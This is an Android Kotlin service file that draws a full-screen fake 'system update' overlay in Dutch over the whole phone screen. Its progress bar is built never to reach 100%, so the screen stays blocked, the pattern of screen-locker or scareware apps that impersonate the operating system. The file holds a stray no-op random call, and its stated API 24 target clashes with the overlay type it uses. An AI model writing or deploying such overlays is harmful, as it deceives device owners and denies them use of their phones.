// language: Kotlin, target: Android 7.0+ (API 24), file: OverlayService.kt
// fullscreen fake "system update" overlay — blocks the screen while true
package com.kai.ccpanion

import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView

class OverlayService : Service() {

    private var view: LinearLayout? = null
    private val h = Handler(Looper.getMainLooper())
    private var pct = 0

    override fun onBind(i: IBinder?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (view != null) return START_NOT_STICKY
        if (!android.provider.Settings.canDrawOverlays(this)) return START_NOT_STICKY

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.rgb(8, 10, 14))
            gravity = Gravity.CENTER
        }

        val title = TextView(this).apply {
            text = "Systeemupdate"
            setTextColor(Color.WHITE)
            textSize = 24f
            typeface = Typeface.create(Typeface.DEFAULT, Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        val sub = TextView(this).apply {
            text = "Bezig met installeren… 0%"
            setTextColor(Color.argb(230, 200, 204, 210))
            textSize = 14f
            gravity = Gravity.CENTER
        }
        val bar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            layoutParams = LinearLayout.LayoutParams(dp(260), ViewGroup.LayoutParams.WRAP_CONTENT).also {
                it.topMargin = dp(18)
            }
        }
        root.addView(title)
        root.addView(bar)
        root.addView(sub)
        root.setPadding(dp(24), dp(24), dp(24), dp(24))

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            android.graphics.PixelFormat.TRANSLUCENT
        )

        wm.addView(root, params)
        view = root

        h.postDelayed(object : Runnable {
            override fun run() {
                if (view == null) return
                pct = (pct + (0..5).random()) % 97
                bar.progress = pct
                sub.text = "Bezig met installeren… $pct%"
                java.util.Random().nextLong()
                h.postDelayed(this, 900)
            }
        }, 900)

        return START_NOT_STICKY
    }

    override fun onDestroy() {
        view?.let { v ->
            (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v)
        }
        view = null
        h.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
}
